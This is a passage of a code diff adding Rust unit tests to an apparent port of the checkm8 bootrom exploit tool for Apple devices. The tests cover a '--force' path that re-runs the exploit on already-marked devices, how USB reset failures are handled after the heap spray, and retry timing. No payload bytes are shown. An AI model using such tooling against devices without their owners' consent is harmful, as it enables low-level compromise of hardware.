         assert_eq!(o.setup_budget.max_millis, 600_000);
+    }
+
+    /// **The `--force` falsifier.** The marker short-circuit is the defect rule 14
+    /// names: on a device whose descriptor already says `PWND:[checkm8]`, a plain
+    /// `run` returns `Pwned` having sent nothing (`transfers=0`), and the verdict
+    /// now refuses `[PWNED]` for exactly that case. `--force` must flip the
+    /// decision, and the FIRST assertion is the control that stops this test from
+    /// being a tautology: without `--force` the skip must remain.
+    #[test]
+    fn force_runs_the_write_path_on_a_marked_device() {
+        let marked = DeviceIdentity::parse(
+            "CPID:8003 CPRV:01 BDID:02 SRTG:[IBOOT-2234.0.0.2.22] PWND:[checkm8]",
+        );
+        let clean =
+            DeviceIdentity::parse("CPID:8003 CPRV:01 BDID:02 SRTG:[IBOOT-2234.0.0.2.22]");
+        assert!(marked.is_pwned() && !clean.is_pwned(), "fixtures must differ on the marker");
+
+        assert!(
+            skip_on_marker(&RunOptions::default(), &marked),
+            "without --force a marked device must still skip the write path (the reference \
+             behaviour, and the source of the 2026-10-03 transfers=0 run)"
+        );
+        let forced = RunOptions {
+            force: true,
+            ..RunOptions::default()
+        };
+        assert!(
+            !skip_on_marker(&forced, &marked),
+            "--force must run the exploit even though the marker is present"
+        );
+        // A clean device is unaffected in both directions: `--force` is not a
+        // different exploit, only a bypass of the marker short-circuit.
+        assert!(!skip_on_marker(&forced, &clean));
+        assert!(!skip_on_marker(&RunOptions::default(), &clean));
     }
 
     /// The probe's state table, pinned by name for every number it can return.
@@ -3373,6 +3803,26 @@ mod tests {
         assert!(e.is_none(), "A9 configs must have large_leak == 0");
         let h = crate::config::all_configs().iter().find(|c| c.hole != 0);
         assert!(h.is_none(), "A9 configs must have hole == 0 (gaster.c:905)");
+    }
+
+    /// **The firing control for instrument fix 4** (review/07 finding 13): the RESET stage's
+    /// claim is DERIVED from its `bus_reset_delivered` predicate — only a DELIVERED reset may
+    /// claim `stage_pass`; everything else is `stage_unproven`, never a PASS sitting next to its
+    /// own FAILed predicate (the corpus census: 139 `stage_pass` RESET vs 350 FAIL / 0 PASS).
+    /// Reverting the derivation flips these assertions red.
+    #[test]
+    fn control_reset_stage_claim_is_derived_from_bus_reset_delivered() {
+        let (kind, detail) = reset_stage_event(true, "issued, delivered");
+        assert_eq!(kind, "stage_pass");
+        assert!(detail.contains("DELIVERED"), "{detail}");
+
+        for evidence in ["issued, effect unverified", "refuted by the device", "driver cannot reset"] {
+            let (kind, detail) = reset_stage_event(false, evidence);
+            assert_eq!(kind, crate::trace::kind::STAGE_UNPROVEN, "{evidence}");
+            assert!(detail.contains("UNPROVEN"), "{detail}");
+            assert!(detail.contains("bus_reset_delivered=FAIL"), "{detail}");
+            assert!(detail.contains(evidence), "{detail}");
+        }
     }
 
     // -- the post-attempt reset gate ---------------------------------------
@@ -3819,5 +4269,270 @@ mod tests {
             other => panic!("{other:?}"),
         }
         assert_eq!(t.counters().total(), 0);
+    }
+
+    // ---- the known drop: a reset refused because the device is ABSENT ------
+    //
+    // MEASURED 2026-10-03: our own run stopped at the post-SPRAY reset because
+    // the spray's DFU_CLRSTATUS (gaster.c:910) drops this bootrom and libusb
+    // then reports LIBUSB_ERROR_NOT_FOUND. That is the exploit's own drop, not a
+    // host capability problem. The two failure kinds must therefore stay apart —
+    // and both directions are pinned here, because the dangerous repair is to
+    // let every failed reset continue (a gate that never fires).
+
+    /// The failure disposition, pinned over the WHOLE libusb error domain — not
+    /// just the two codes seen so far (§9.3: a table tested on a sample ratifies
+    /// the cells nobody looked at).
+    #[test]
+    fn reset_failure_disposition_pins_the_whole_domain() {
+        // The binding's own constants are the ones classified.
+        assert_eq!(crate::types::LIBUSB_ERROR_OTHER, -99);
+        assert!(reset_error_is_device_absent(-4), "LIBUSB_ERROR_NO_DEVICE");
+        assert!(reset_error_is_device_absent(-5), "LIBUSB_ERROR_NOT_FOUND");
+
+        // The two "the device is not there" codes: continue and wait.
+        for rc in [-5, -4] {
+            assert!(
+                reset_error_is_device_absent(rc),
+                "{rc} must classify as absent"
+            );
+            assert_eq!(
+                reset_failure_disposition(rc, false),
+                ResetDisposition::KnownDrop,
+                "{rc}: absent, so the run continues by itself"
+            );
+            assert_eq!(
+                reset_failure_disposition(rc, true),
+                ResetDisposition::KnownDrop,
+                "{rc}: the override changes nothing about a known drop"
+            );
+        }
+
+        // Everything else — IO, INVALID_PARAM, ACCESS, BUSY, TIMEOUT, OVERFLOW,
+        // PIPE, INTERRUPTED, NO_MEM, NOT_SUPPORTED, OTHER, success, and values
+        // outside the domain — is a refusal with the device present: STOP.
+        for rc in [-1, -2, -3, -6, -7, -8, -9, -10, -11, -12, -99, 0, 1, 42, i32::MAX, i32::MIN] {
+            assert!(
+                !reset_error_is_device_absent(rc),
+                "{rc} must not classify as absent"
+            );
+            assert_eq!(
+                reset_failure_disposition(rc, false),
+                ResetDisposition::Stop,
+                "{rc}: a refusal with the device present must still stop the run"
+            );
+            assert_eq!(
+                reset_failure_disposition(rc, true),
+                ResetDisposition::StopOverridden,
+                "{rc}: --allow-winusb continues loudly, it does not erase the failure"
+            );
+        }
+
+        // The negative control for the obvious wrong fix, stated as a property:
+        // no code outside the absent pair may ever continue by itself.
+        for rc in -200..=200 {
+            if reset_failure_disposition(rc, false) == ResetDisposition::KnownDrop {
+                assert!(
+                    reset_error_is_device_absent(rc),
+                    "{rc} continued as a known drop without being an absence code"
+                );
+            }
+        }
+    }
+
+    /// The four classes a reset can land in, pinned together so no entry can
+    /// drift: delivered, issued-but-unverified, refused with the device present,
+    /// and refused because the device was absent. `--allow-winusb` downgrades
+    /// exactly the two `Stop` classes and changes nothing else.
+    #[test]
+    fn the_four_reset_classes_are_pinned_together() {
+        assert_eq!(reset_gate(ResetEvidence::Delivered, false), ResetGate::Continue);
+        assert_eq!(
+            reset_gate(ResetEvidence::Unverified, false),
+            ResetGate::ContinueLoudly
+        );
+        assert_eq!(reset_gate(ResetEvidence::Refuted, false), ResetGate::Stop);
+        assert_eq!(
+            reset_gate(ResetEvidence::DriverCannotReset, false),
+            ResetGate::Stop
+        );
+
+        assert_eq!(
+            reset_failure_disposition(-5, false),
+            ResetDisposition::KnownDrop,
+            "LIBUSB_ERROR_NOT_FOUND: the known drop"
+        );
+        assert_eq!(
+            reset_failure_disposition(-4, false),
+            ResetDisposition::KnownDrop,
+            "LIBUSB_ERROR_NO_DEVICE: the same situation one layer out"
+        );
+        assert_eq!(
+            reset_failure_disposition(-7, false),
+            ResetDisposition::Stop,
+            "a timeout with the device present is a refusal"
+        );
+
+        for rc in [-1, -2, -3, -6, -7, -8, -9, -10, -11, -12, -99] {
+            assert_eq!(
+                reset_failure_disposition(rc, true),
+                ResetDisposition::StopOverridden,
+                "{rc}"
+            );
+        }
+        assert_eq!(reset_gate(ResetEvidence::Refuted, true), ResetGate::ContinueLoudly);
+        assert_eq!(
+            reset_gate(ResetEvidence::DriverCannotReset, true),
+            ResetGate::ContinueLoudly
+        );
+        // The override never turns a delivered reset into anything else.
+        assert_eq!(reset_gate(ResetEvidence::Delivered, true), ResetGate::Continue);
+    }
+
+    /// The drop is recorded as **its own evidence**, and cannot be counted as an
+    /// unattributed reset: a bare `kind::RESET` with no evidence is exactly what
+    /// `Counters::resets_unrecorded` feeds to the `RESET_NOT_DELIVERED` verdict,
+    /// which would blame the host for the exploit's own drop.
+    #[test]
+    fn the_known_drop_is_its_own_evidence_and_never_an_unrecorded_reset() {
+        assert_ne!(
+            KIND_RESET_AFTER_DROP,
+            kind::RESET,
+            "the drop must not use the bare reset kind"
+        );
+
+        let mut drop_tracer = Tracer::new(None, false).expect("a tracer with no sink");
+        drop_tracer.event(
+            KIND_RESET_AFTER_DROP,
+            Some(Stage::Reset),
+            "when=post-stage after=SPRAY: the reset call failed because the device was ABSENT \
+             (rc=-5, 2 us)",
+        );
+        let c = drop_tracer.counters();
+        assert_eq!(
+            c.resets_attempted, 0,
+            "the known drop is not an attempted reset"
+        );
+        assert_eq!(
+            c.resets_unrecorded(),
+            0,
+            "the known drop must never read as an unrecorded reset"
+        );
+        assert_eq!(c.total(), 0, "and it is not a transfer");
+
+        // Control: the same sentence under `kind::RESET` WOULD be counted as an
+        // unrecorded attempt — which is the defect this separation prevents.
+        let mut bare_tracer = Tracer::new(None, false).expect("a tracer with no sink");
+        bare_tracer.event(
+            kind::RESET,
+            Some(Stage::Reset),
+            "the reset call failed: LIBUSB_ERROR_NOT_FOUND (-5)",
+        );
+        let b = bare_tracer.counters();
+        assert_eq!(b.resets_attempted, 1, "the control does count");
+        assert_eq!(
+            b.resets_unrecorded(),
+            1,
+            "the control is why the drop must not use kind::RESET"
+        );
+    }
+
+    /// E5-3, pinned: the wait for a re-enumerating device is bounded by a
+    /// **duration**, with an attempt cap only as a spin guard — and the recorded
+    /// line carries the wall-clock absence, because an attempt count is not a
+    /// duration (LINUX-HANDOFF §4.8: "19 attempts" was 285-292 ms).
+    #[test]
+    fn open_retry_is_bounded_by_wall_clock_not_attempts() {
+        assert!(open_retry_allowed(Duration::ZERO, 0));
+        assert!(open_retry_allowed(OPEN_RETRY_BUDGET - Duration::from_micros(1), 0));
+        assert!(
+            !open_retry_allowed(OPEN_RETRY_BUDGET, 0),
+            "the budget is the bound, and it is exclusive"
+        );
+        assert!(!open_retry_allowed(OPEN_RETRY_BUDGET + Duration::from_secs(60), 0));
+        assert!(
+            !open_retry_allowed(Duration::ZERO, OPEN_RETRY_TRIES),
+            "the attempt cap is a spin guard"
+        );
+        assert!(open_retry_allowed(Duration::ZERO, OPEN_RETRY_TRIES - 1));
+        assert!(
+            OPEN_RETRY_BUDGET > Duration::from_millis(435),
+            "the budget must exceed the MEASURED 435 ms post-CLR_STATUS return"
+        );
+
+        let ok = open_retry_ok_note(3, Duration::from_millis(435));
+        assert!(ok.contains("attempt 3"), "{ok}");
+        assert!(ok.contains("435.000 ms"), "{ok}");
+        assert!(ok.contains("wall-clock"), "{ok}");
+        assert!(ok.contains("gaster waits forever"), "{ok}");
+
+        let gone = open_retry_exhausted_note(
+            Duration::from_millis(3_001),
+            612,
+            "no Apple device among 40 USB device(s)",
+        );
+        assert!(gone.contains("3001 ms"), "{gone}");
+        assert!(gone.contains("612 open attempt"), "{gone}");
+        assert!(gone.contains("40 USB device"), "{gone}");
+        assert!(
+            gone.contains("budget"),
+            "the reader must see which bound expired: {gone}"
+        );
+    }
+
+    /// The pause rule, whole domain — and the property that matters: however the
+    /// operator configures `--usb-timeout-ms`, the budget admits MANY attempts,
+    /// not one. MEASURED defect (reviewer, 2026-10-03): with 5000 ms the old
+    /// pause crossed the whole 3 s budget in a single sleep, so the loop made
+    /// exactly one attempt and the 435 ms re-enumeration could never be caught.
+    #[test]
+    fn open_retry_pause_pins_the_whole_domain() {
+        assert_eq!(
+            open_retry_pause(Duration::from_millis(5), Duration::ZERO),
+            Duration::from_millis(5),
+            "the default interval is honoured as configured"
+        );
+        assert_eq!(open_retry_pause(Duration::ZERO, Duration::ZERO), Duration::ZERO);
+        assert_eq!(
+            open_retry_pause(Duration::from_millis(5_000), Duration::ZERO),
+            OPEN_RETRY_MAX_PAUSE,
+            "a slow configured timeout must not consume the budget in one sleep"
+        );
+        assert_eq!(
+            open_retry_pause(
+                Duration::from_millis(5_000),
+                OPEN_RETRY_BUDGET - Duration::from_millis(20)
+            ),
+            Duration::from_millis(20),
+            "never past the budget"
+        );
+        assert_eq!(
+            open_retry_pause(Duration::from_millis(5), OPEN_RETRY_BUDGET),
+            Duration::ZERO
+        );
+        assert_eq!(
+            open_retry_pause(
+                Duration::from_millis(5),
+                OPEN_RETRY_BUDGET + Duration::from_secs(1)
+            ),
+            Duration::ZERO
+        );
+
+        // The property, simulated over the real predicate: at least 60 attempts
+        // inside the budget for every interval the option can be set to.
+        for configured_ms in [0u64, 1, 5, 50, 500, 3_000, 5_000, 60_000] {
+            let configured = Duration::from_millis(configured_ms);
+            let mut elapsed = Duration::ZERO;
+            let mut attempts = 0u32;
+            while open_retry_allowed(elapsed, attempts) {
+                attempts += 1;
+                elapsed += open_retry_pause(configured, elapsed);
+            }
+            assert!(
+                attempts >= 60,
+                "--usb-timeout-ms {configured_ms} yields only {attempts} attempt(s) inside \
+                 {OPEN_RETRY_BUDGET:?}; the 435 ms re-enumeration must be catchable"
+            );
+        }
     }
 }
